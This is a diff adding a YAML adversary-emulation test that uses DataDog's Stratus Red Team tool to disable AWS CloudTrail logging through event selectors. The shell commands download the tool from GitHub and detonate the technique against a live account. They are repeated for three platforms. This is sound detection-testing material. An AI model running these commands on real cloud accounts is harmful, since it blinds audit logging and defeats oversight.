@@ -1,0 +1,72 @@
+---
+- id: 1069a0bc3e1eb0a8f61915d79259af8b
+  name: AWS - Disable CloudTrail Logging Through Event Selectors using Stratus
+  description: 'Update event selectors in AWS CloudTrail to disable the logging of
+    certain management events to evade defense. This Atomic test leverages a tool
+    called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team).
+    Stratus Red Team is a self-contained binary. You can use it to easily detonate
+    offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685.002
+    name: 'Disable or Modify Tools: Disable or Modify Cloud Log'
+  platforms:
+    linux:
+      sh:
+        command: 'if [ -f $PathToAtomicsFolder/T1685.002/src/stratus ]; then : ; else
+          if [ "$(uname)" == "Darwin" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
+          | grep browser_download_url | grep Darwin_x86_64 | cut -d ''"'' -f 4); wget
+          -q -O $PathToAtomicsFolder/T1685.002/src/stratus-red-team-latest.tar.gz
+          $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1685.002/src/stratus-red-team-latest.tar.gz
+          --directory $PathToAtomicsFolder/T1685.002/src/; elif [ "$(expr substr $(uname)
+          1 5)" == "Linux" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
+          | grep browser_download_url | grep linux_x86_64 | cut -d ''"'' -f 4) ;   wget
+          -q -O $PathToAtomicsFolder/T1685.002/src/stratus-red-team-latest.tar.gz
+          $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1685.002/src/stratus-red-team-latest.tar.gz
+          --directory $PathToAtomicsFolder/T1685.002/src/; fi; fi;  export AWS_REGION=us-west-2
+          ; cd $PathToAtomicsFolder/T1685.002/src; echo "starting warmup"; ./stratus
+          warmup aws.defense-evasion.cloudtrail-event-selectors; echo "starting detonate";
+          ./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force'
+        payloads: []
+        cleanup: export AWS_REGION=us-west-2; echo "Cleanup detonation"; cd $PathToAtomicsFolder/T1685.002/src;
+          ./stratus cleanup --all; rm -rf stratus*
+    darwin:
+      sh:
+        command: 'if [ -f $PathToAtomicsFolder/T1685.002/src/stratus ]; then : ; else
+          if [ "$(uname)" == "Darwin" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
+          | grep browser_download_url | grep Darwin_x86_64 | cut -d ''"'' -f 4); wget
+          -q -O $PathToAtomicsFolder/T1685.002/src/stratus-red-team-latest.tar.gz
+          $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1685.002/src/stratus-red-team-latest.tar.gz
+          --directory $PathToAtomicsFolder/T1685.002/src/; elif [ "$(expr substr $(uname)
+          1 5)" == "Linux" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
+          | grep browser_download_url | grep linux_x86_64 | cut -d ''"'' -f 4) ;   wget
+          -q -O $PathToAtomicsFolder/T1685.002/src/stratus-red-team-latest.tar.gz
+          $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1685.002/src/stratus-red-team-latest.tar.gz
+          --directory $PathToAtomicsFolder/T1685.002/src/; fi; fi;  export AWS_REGION=us-west-2
+          ; cd $PathToAtomicsFolder/T1685.002/src; echo "starting warmup"; ./stratus
+          warmup aws.defense-evasion.cloudtrail-event-selectors; echo "starting detonate";
+          ./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force'
+        payloads: []
+        cleanup: export AWS_REGION=us-west-2; echo "Cleanup detonation"; cd $PathToAtomicsFolder/T1685.002/src;
+          ./stratus cleanup --all; rm -rf stratus*
+    unknown:
+      sh:
+        command: 'if [ -f $PathToAtomicsFolder/T1685.002/src/stratus ]; then : ; else
+          if [ "$(uname)" == "Darwin" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
+          | grep browser_download_url | grep Darwin_x86_64 | cut -d ''"'' -f 4); wget
+          -q -O $PathToAtomicsFolder/T1685.002/src/stratus-red-team-latest.tar.gz
+          $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1685.002/src/stratus-red-team-latest.tar.gz
+          --directory $PathToAtomicsFolder/T1685.002/src/; elif [ "$(expr substr $(uname)
+          1 5)" == "Linux" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
+          | grep browser_download_url | grep linux_x86_64 | cut -d ''"'' -f 4) ;   wget
+          -q -O $PathToAtomicsFolder/T1685.002/src/stratus-red-team-latest.tar.gz
+          $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1685.002/src/stratus-red-team-latest.tar.gz
+          --directory $PathToAtomicsFolder/T1685.002/src/; fi; fi;  export AWS_REGION=us-west-2
+          ; cd $PathToAtomicsFolder/T1685.002/src; echo "starting warmup"; ./stratus
+          warmup aws.defense-evasion.cloudtrail-event-selectors; echo "starting detonate";
+          ./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force'
+        payloads: []
+        cleanup: export AWS_REGION=us-west-2; echo "Cleanup detonation"; cd $PathToAtomicsFolder/T1685.002/src;
+          ./stratus cleanup --all; rm -rf stratus*
